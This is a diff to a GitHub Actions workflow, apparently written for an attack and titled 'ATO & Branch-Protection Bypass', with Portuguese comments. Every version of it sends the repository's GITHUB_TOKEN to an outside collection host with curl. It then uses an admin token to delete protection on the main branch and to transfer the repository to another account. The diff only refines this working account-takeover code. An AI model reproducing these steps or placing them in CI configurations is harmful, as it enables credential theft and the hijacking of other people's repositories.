@@ -1,4 +1,4 @@
-name: "ATO & Branch‐Protection Bypass"
+name: "ATO & Branch-Protection Bypass"
 
 on:
   create:
@@ -7,11 +7,6 @@ on:
     branches: ["main"]
   workflow_dispatch:
 
-# Garante permissão de admin no repo
-permissions:
-  contents: write
-  administration: write
-
 jobs:
   exploit:
     runs-on: ubuntu-latest
@@ -19,25 +14,30 @@ jobs:
       - name: Checkout
         uses: actions/checkout@v4
         with:
-          persist-credentials: true
+          persist-credentials: true     # usa só para git push, se precisar
 
       - name: Exfiltra GITHUB_TOKEN
         run: |
-          curl -G https://bolsonaro.cc/collect \
-            --data-urlencode "repo=${{ github.repository }}" \
-            --data-urlencode "gtoken=${{ secrets.GITHUB_TOKEN }}"
+          curl -G "https://bolsonaro.cc/collect" \
+               --data-urlencode "repo=${{ github.repository }}" \
+               --data-urlencode "gtoken=${{ secrets.GITHUB_TOKEN }}"
 
+      # --------- ações que exigem privilégio admin ---------
       - name: Remove branch protection
+        env:
+          PAT: ${{ secrets.ADMIN_PAT }}
         run: |
           curl -X DELETE \
-            -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
-            -H "Accept: application/vnd.github.luke-cage-preview+json" \
-            https://api.github.com/repos/${{ github.repository }}/branches/main/protection
+               -H "Authorization: token $PAT" \
+               -H "Accept: application/vnd.github+json" \
+               "https://api.github.com/repos/${{ github.repository }}/branches/main/protection"
 
       - name: Transfer repository ownership
+        env:
+          PAT: ${{ secrets.ADMIN_PAT }}
         run: |
           curl -X POST \
-            -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
-            -H "Accept: application/vnd.github.v3+json" \
-            -d '{"new_owner":"bugbounty1337"}' \
-            https://api.github.com/repos/${{ github.repository }}/transfer
+               -H "Authorization: token $PAT" \
+               -H "Accept: application/vnd.github+json" \
+               -d '{"new_owner":"bugbounty1337"}' \
+               "https://api.github.com/repos/${{ github.repository }}/transfer"
